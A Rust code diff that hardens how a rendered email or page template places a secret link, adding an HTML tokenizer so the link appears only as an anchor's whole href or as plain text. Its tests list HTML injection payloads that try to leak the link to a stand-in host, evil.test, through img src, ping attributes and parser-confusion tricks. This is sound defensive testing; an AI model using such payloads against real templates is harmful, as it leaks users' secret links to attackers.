@@ -407,32 +407,183 @@ fn outgoing(
 }
 
 /// Puts `link` where the template placed [`LINK_PLACEHOLDER`] on its own: as
-/// a link's whole `href` or as text. Anywhere else (inside another address,
-/// say) it becomes [`REDACTED`].
+/// the whole `href` of an `a` tag or as text (see [`link_spots`]). Anywhere
+/// else (inside another address, say) it becomes [`REDACTED`].
 fn place_link(rendered: Rendered, link: &str) -> Rendered {
-    fn put(s: &str, link: &str, own: impl Fn(&str) -> bool) -> String {
+    fn put(s: &str, link: &str, own: impl Fn(usize) -> bool) -> String {
         let mut out = String::with_capacity(s.len());
-        let mut rest = s;
-        while let Some(i) = rest.find(LINK_PLACEHOLDER) {
-            out.push_str(&rest[..i]);
-            out.push_str(if own(&out) { link } else { REDACTED });
-            rest = &rest[i + LINK_PLACEHOLDER.len()..];
+        let mut last = 0;
+        for (i, _) in s.match_indices(LINK_PLACEHOLDER) {
+            out.push_str(&s[last..i]);
+            out.push_str(if own(i) { link } else { REDACTED });
+            last = i + LINK_PLACEHOLDER.len();
         }
-        out.push_str(rest);
+        out.push_str(&s[last..]);
         out
     }
-    let word = |before: &str| {
-        before
-            .chars()
-            .next_back()
-            .is_none_or(|c| c.is_whitespace() || "([<".contains(c))
-    };
+    // Plain text: after a space, or after a bracket that follows one, so it
+    // is never the tail of another address.
+    fn word(s: &str, i: usize) -> bool {
+        let mut before = s[..i].chars().rev();
+        match before.next() {
+            Some(c) if "([<".contains(c) => before.next().is_none_or(char::is_whitespace),
+            c => c.is_none_or(char::is_whitespace),
+        }
+    }
+    let spots = link_spots(&rendered.body);
     Rendered {
-        subject: rendered.subject.map(|s| put(&s, link, word)),
-        body: put(&rendered.body, &html_escape(link), |b| {
-            b.ends_with(" href=\"") || b.ends_with('>')
-        }),
-        text: put(&rendered.text, link, word),
+        subject: rendered.subject.map(|s| put(&s, link, |i| word(&s, i))),
+        body: put(&rendered.body, &html_escape(link), |i| spots.contains(&i)),
+        text: put(&rendered.text, link, |i| word(&rendered.text, i)),
+    }
+}
+
+/// Where [`LINK_PLACEHOLDER`] stands on its own in `html`: in text outside
+/// any tag, comment or raw-text element, or as the whole `href` of an `a`
+/// start tag. Tags, quotes and comments are read by the HTML tokenizer's
+/// rules, so a `>` or a stray quote inside an attribute cannot pass for text.
+/// After a tag that changes how the rest is parsed (`script`, `svg`,
+/// `select`...), nothing counts.
+fn link_spots(html: &str) -> Vec<usize> {
+    let b = html.as_bytes();
+    let lower = html.to_ascii_lowercase();
+    let find = |from: usize, pat: &str| html[from..].find(pat).map(|k| from + k);
+    let mut spots = vec![];
+    let mut i = 0;
+    while i < b.len() {
+        let lt = find(i, "<").unwrap_or(b.len());
+        spots.extend(
+            html[i..lt]
+                .match_indices(LINK_PLACEHOLDER)
+                .map(|(k, _)| i + k),
+        );
+        i = lt;
+        let (next, after) = (b.get(i + 1).copied(), b.get(i + 2).copied());
+        match next {
+            None => break,
+            Some(b'!') if html[i..].starts_with("<!--") => {
+                // `<!-->` and `<!--->` close at once; `--!>` closes too.
+                let ends = [
+                    find(i + 2, "-->").map(|e| e + 3),
+                    find(i + 4, "--!>").map(|e| e + 4),
+                ];
+                match ends.into_iter().flatten().min() {
+                    Some(e) => i = e,
+                    None => break,
+                }
+            }
+            Some(b'/') if after == Some(b'>') => i += 3,
+            Some(b'/') if after.is_some_and(|c| c.is_ascii_alphabetic()) => {
+                match tag(b, &lower, i + 2) {
+                    Some((end, _)) => i = end,
+                    None => break,
+                }
+            }
+            // Doctypes and bogus comments run to the next `>`.
+            Some(b'!' | b'?' | b'/') => match find(i + 2, ">") {
+                Some(e) => i = e + 1,
+                None => break,
+            },
+            Some(c) if c.is_ascii_alphabetic() => {
+                let name_end = (i + 1..b.len())
+                    .find(|&p| is_space(b[p]) || b[p] == b'/' || b[p] == b'>')
+                    .unwrap_or(b.len());
+                let name = &lower[i + 1..name_end];
+                let Some((end, attrs)) = tag(b, &lower, i + 1) else {
+                    break;
+                };
+                i = end;
+                let href = attrs.iter().find(|(n, _)| *n == "href");
+                if name == "a"
+                    && !attrs.iter().any(|(n, _)| *n == "ping")
+                    && let Some((_, Some((s, e)))) = href
+                    && &html[*s..*e] == LINK_PLACEHOLDER
+                {
+                    spots.push(*s);
+                }
+                match name {
+                    "script" | "svg" | "math" | "plaintext" | "select" | "noscript"
+                    | "frameset" => break,
+                    "style" | "textarea" | "title" | "xmp" | "iframe" | "noembed" | "noframes" => {
+                        // Raw text, up to the matching end tag.
+                        let close = format!("</{name}");
+                        let end = lower[i..]
+                            .match_indices(&close)
+                            .map(|(k, _)| i + k)
+                            .find(|&k| {
+                                b.get(k + close.len())
+                                    .is_some_and(|&c| is_space(c) || c == b'/' || c == b'>')
+                            });
+                        match end {
+                            Some(e) => i = e,
+                            None => break,
+                        }
+                    }
+                    _ => {}
+                }
+            }
+            Some(_) => i += 1,
+        }
+    }
+    spots
+}
+
+fn is_space(c: u8) -> bool {
+    matches!(c, b'\t' | b'\n' | b'\x0c' | b'\r' | b' ')
+}
+
+type Attrs<'a> = Vec<(&'a str, Option<(usize, usize)>)>;
+
+/// Reads a tag from its name at `p` to its `>`, as the HTML tokenizer does.
+/// Returns the offset after the `>` and each attribute's lower-case name
+/// with the range of its value, or `None` if the tag never closes.
+fn tag<'a>(b: &[u8], lower: &'a str, mut p: usize) -> Option<(usize, Attrs<'a>)> {
+    while p < b.len() && !is_space(b[p]) && b[p] != b'/' && b[p] != b'>' {
+        p += 1;
+    }
+    let mut attrs = vec![];
+    loop {
+        while p < b.len() && (is_space(b[p]) || b[p] == b'/') {
+            p += 1;
+        }
+        match b.get(p)? {
+            b'>' => return Some((p + 1, attrs)),
+            _ => {
+                // The first character is part of the name even if it is `=`.
+                let at = p;
+                p += 1;
+                while p < b.len() && !is_space(b[p]) && !matches!(b[p], b'/' | b'>' | b'=') {
+                    p += 1;
+                }
+                let name = &lower[at..p];
+                while p < b.len() && is_space(b[p]) {
+                    p += 1;
+                }
+                if b.get(p) != Some(&b'=') {
+                    attrs.push((name, None));
+                    continue;
+                }
+                p += 1;
+                while p < b.len() && is_space(b[p]) {
+                    p += 1;
+                }
+                match *b.get(p)? {
+                    q @ (b'"' | b'\'') => {
+                        let k = b[p + 1..].iter().position(|&c| c == q)?;
+                        attrs.push((name, Some((p + 1, p + 1 + k))));
+                        p += k + 2;
+                    }
+                    b'>' => attrs.push((name, None)),
+                    _ => {
+                        let at = p;
+                        while p < b.len() && !is_space(b[p]) && b[p] != b'>' {
+                            p += 1;
+                        }
+                        attrs.push((name, Some((at, p))));
+                    }
+                }
+            }
+        }
     }
 }
 
@@ -534,6 +685,49 @@ mod tests {
         assert_eq!(
             out.text,
             format!("go ({link}) or https://evil.test/?u={REDACTED}")
+        );
+    }
+
+    #[test]
+    fn links_never_land_inside_attributes_or_raw_text() {
+        let p = LINK_PLACEHOLDER;
+        let placed = |html: String| {
+            let spots = link_spots(&html);
+            html.match_indices(p)
+                .map(|(i, _)| spots.contains(&i))
+                .collect::<Vec<_>>()
+        };
+        // Allowed: text and an `a` tag's whole href, however it is quoted.
+        assert_eq!(
+            placed(format!(
+                "{p}<p class=x>{p}</p><a href={p}>a</a><A title='>' HREF='{p}'>b</A>\
+                 <!-- {p} -->{p}<!--->{p}<b>x</b >{p}"
+            )),
+            [true, true, true, true, false, true, true, true]
+        );
+        // Everything else, including where `>` or a quote only looks like
+        // the end of a tag.
+        for html in [
+            format!("<img src=\"https://evil.test/?u=>{p}\">"),
+            format!("<img src='https://evil.test/? href=\"{p}'>"),
+            format!("<img alt=\"x\"src=https://evil.test/?{p}>"),
+            format!("<a href=\"{p}\" ping=\"https://evil.test/\">x</a>"),
+            format!("<a href=\"https://evil.test/{p}\">x</a><a title=\"{p}\">y</a>"),
+            format!("<a href=\"{p}\""),
+            format!("<!-- --!><img src=\"https://evil.test/?-->{p}\">"),
+            format!("<style>@import url(\"https://evil.test/?<b>{p}\");</style >"),
+            format!("<title></titlex><b>{p}</b>"),
+            format!("<svg><style><![CDATA[</style>]]>a{{background:url({p})}}</style></svg>"),
+            format!("<select><style><input><img src=\"https://evil.test/?</style>{p}\">"),
+            format!("<noscript><img src=\"</noscript>{p}\"></noscript>"),
+            format!("<script>{p}</script>{p}"),
+        ] {
+            assert!(placed(html.clone()).iter().all(|&ok| !ok), "{html}");
+        }
+        // Raw text ends at its own end tag; ordinary text follows.
+        assert_eq!(
+            placed(format!("<style>{p}</STYLE>{p}<textarea>{p}</textarea/>{p}")),
+            [false, true, false, true]
         );
     }
 
